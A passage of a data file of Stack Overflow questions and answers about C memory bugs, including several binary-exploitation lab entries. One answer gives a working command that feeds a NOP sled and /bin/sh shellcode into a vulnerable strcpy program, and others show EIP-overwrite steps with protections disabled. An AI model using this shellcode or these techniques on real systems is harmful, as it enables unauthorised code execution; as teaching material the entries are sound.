return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             